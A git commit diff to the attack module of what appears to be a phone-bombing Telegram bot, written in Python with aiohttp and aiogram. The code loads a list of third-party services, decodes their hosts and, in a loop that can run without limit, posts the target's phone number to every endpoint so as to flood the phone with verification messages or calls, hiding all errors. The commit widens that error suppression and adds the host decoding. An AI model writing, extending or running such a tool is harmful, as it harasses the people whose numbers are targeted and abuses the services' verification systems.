08d57c5e9228adcb4b3d92d98920c562c1e31e5a
Batya02 <magomedov.abdul20012@gmail.com>
2021-07-20 18:35:18 +0300

    changes

--- targs/attack.py
+++ targs/attack.py
@@ -1,14 +1,22 @@
-from json import loads
+from json import loads, dumps
 from aiohttp import ClientSession
 from asyncio import sleep
+from random import choice
 
 from objects import globals
 
 from aiohttp.client_exceptions import (
-        ClientConnectionError, ClientOSError)
+        ClientConnectionError, ClientOSError, 
+        ClientResponseError
+        )
+from asyncio.exceptions import TimeoutError
 
 from aiogram.types import Message
 from datetime import datetime as dt
+
+from temp.headers import headers
+
+from formats.decode_host import decode_host
 
 class Attack:
     phone:str
@@ -16,10 +24,10 @@ class Attack:
 
     def __init__(self, phone="", user_id=None):
         """
-        phone - Get user phone 
+        phone          - Get user phone 
         client_session - ClientSession
         process_status - default True
-        state_circles - default 0
+        state_circles  - default 0
         """
         self.phone:str = phone 
         self.user_id = user_id
@@ -33,8 +41,10 @@ class Attack:
         self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
         circles_status = self.user_data[0].status
 
+        #Check circles count
         if circles_status == "∞":
             self.state_circles = "∞"
+
         elif int(circles_status) == 0:
             await globals.bot.delete_message(
                 chat_id = message.chat.id, 
@@ -48,10 +58,13 @@ class Attack:
         else:
             self.state_circles:int = int(circles_status)
 
-        with open(r"sites/RU.json") as sites_read:
-            sites = loads(sites_read.read())
+        #Load all services
+        with open(r"sites/services.json") as services_load:
+            services = loads(services_load.read())
 
+        #Run attack process
         while self.process_status:
+
             if self.state_circles == "∞":pass
             elif self.state_circles == 0:
                 #Update count circles (auto stoping)
@@ -65,41 +78,49 @@ class Attack:
                     text="Количество кругов израсходовано!"
                 )
 
-            for site in sites.values():
-                try:
-                    if "data" in site.keys():
-                        #Type data
-                        data_data = site["data"]
-                        data_data[site["arg"]] = site["plus"]+self.phone
-                        async with self.client_session.post(
-                            url=site["url"], data=data_data, 
-                            timeout=2) as resp:pass
-
-                    elif "json" in site.keys():
-                        #Type json
-                        json_data = site["json"]
-                        json_data[site["arg"]] = site["plus"]+self.phone
-                        async with self.client_session.post(
-                            url=site["url"], json=json_data, 
-                            timeout=2) as resp:pass
+            for k,v in services.items():
                     
-                    elif "params" in site.keys():
-                        #Type params
-                        params_data = site["params"]
-                        params_data[site["arg"]] = site["plus"]+self.phone
-                        async with self.client_session.post(
-                            url=site["url"], json=params_data, 
-                            timeout=2) as resp:pass
-                    else:
-                        #Type formating
-                        url = site["url"].format(self.phone)
-                        async with self.client_session.post(
-                            url=url, timeout=2) as resp:pass
+                    if "data" in v.keys():
 
-                except (ClientConnectionError, ClientOSError):pass
-                except TimeoutError:pass
-                except RuntimeError:pass
-                except TypeError:pass
+                        url = v["url"] % decode_host(k)                      #Url
+                        _data = (v["data"] % self.phone).replace("'", "\"")  #Data(type=data)
+                        print(url, _data)
+
+                        try:
+                            await self.client_session.post(
+                                url=url,   data=loads(_data), 
+                                timeout=2
+                                )
+                        except (TimeoutError,  ClientConnectionError, 
+                                ClientOSError, RuntimeError, 
+                                TypeError,     ClientResponseError
+                                ):pass
+                    
+                    elif "json" in v.keys():
+
+                        url = v["url"] % decode_host(k)                     #Url
+                        _json = (v["json"] % self.phone).replace("'", "\"") #Data(type=json)
+
+                        try:
+                            await self.client_session.post(
+                                url=url,   json=loads(_json), 
+                                timeout=2
+                                )
+                        except (TimeoutError,  ClientConnectionError, 
+                                ClientOSError, RuntimeError, 
+                                TypeError,     ClientResponseError
+                                ):pass
+
+                    else:
+                        try:
+                            url = v["url"] % (decode_host(k), self.phone,) #Url
+                            await self.client_session.post(
+                                url=url, timeout=2
+                                )
+                        except (TimeoutError,  ClientConnectionError, 
+                                ClientOSError, RuntimeError, 
+                                TypeError,     ClientResponseError
+                                ):pass
         
             await sleep(3) #Time-out
             if circles_status == "∞":pass
@@ -112,5 +133,6 @@ class Attack:
                 last_phone=self.phone, 
                 last_date=dt.now()
                 )
+
         self.process_status = False         #Change process status 
         await self.client_session.close()   #Stop process attack
